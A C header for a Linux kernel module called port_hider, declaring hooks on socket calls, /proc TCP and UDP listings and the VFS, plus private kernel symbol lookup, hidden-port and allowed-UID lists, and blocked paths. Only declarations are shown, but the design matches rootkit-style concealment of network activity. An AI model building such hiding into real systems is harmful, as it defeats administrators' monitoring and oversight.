#ifndef PORT_HIDER_H
#define PORT_HIDER_H

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/kprobes.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/user_namespace.h>
#include <linux/uaccess.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/in6.h>
#include <linux/inet.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/hash.h>
#include <linux/hashtable.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/byteorder/generic.h>
#include <linux/seq_file.h>
#include <linux/err.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/workqueue.h>
#include <net/inet_sock.h>
#include <net/tcp.h>

#ifndef PORT_HIDER_VER
#error "PORT_HIDER_VER not defined — must be passed via -D from Makefile (reads Iris)"
#endif

#define MAX_PORTS 32
#define MAX_UIDS 32
#define FD_HASH_BITS 8
#define FD_HASH_SIZE (1 << FD_HASH_BITS)
#define MAX_BLOCKED_PATHS 16

struct fd_entry {
    struct hlist_node node;
    pid_t tgid;
    unsigned int fd;
    u16 orig_port;
};

struct blocked_entry {
    dev_t dev;
    unsigned long ino;
    bool valid;
};

enum hook_type {
    HOOK_CONNECT = 1,
    HOOK_BIND    = 2,
    HOOK_GSN     = 4,
    HOOK_CLOSE   = 8,
    HOOK_PROC    = 16,
    HOOK_UDP     = 32,
    HOOK_VFS     = 64,
};

extern u16 hidden_ports[MAX_PORTS];
extern int nr_hidden_ports;
extern kuid_t allowed_uids[MAX_UIDS];
extern int nr_allowed_uids;
extern struct hlist_head fd_htable[FD_HASH_SIZE];
extern spinlock_t fd_lock;
extern int debug;
extern struct blocked_entry blocked[MAX_BLOCKED_PATHS];
extern int nr_blocked;

#define pr_dbg(fmt, ...) \
    do { if (debug) pr_debug(fmt, ##__VA_ARGS__); } while (0)

/* kallsyms.c */
int setup_kallsyms(void);
unsigned long find_sym(const char *name);
unsigned long find_sys(const char *base);

/* helpers.c */
bool is_allowed_task(void);
bool is_hidden_port(u16 port);
bool addr_is_loopback6(const struct in6_addr *a);
int parse_ports(const char *str);
int parse_uids(const char *str, kuid_t *uids, int max);

/* fdmap.c */
void fd_del(pid_t tgid, unsigned int fd);
void fd_add(pid_t tgid, unsigned int fd, u16 port);
bool fd_get(pid_t tgid, unsigned int fd, u16 *port);
void fdmap_cleanup(void);

/* connect.c */
int setup_connect(void);
void cleanup_connect(void);

/* bind.c */
int setup_bind(void);
void cleanup_bind(void);
int setup_gsn(void);
void cleanup_gsn(void);
int setup_close(void);
void cleanup_close(void);

/* proc.c */
int setup_tcp_proc(void);
void cleanup_tcp_proc(void);
int setup_udp_proc(void);
void cleanup_udp_proc(void);

/* vfs.c */
int setup_vfs(void);
void cleanup_vfs(void);

#endif /* PORT_HIDER_H */
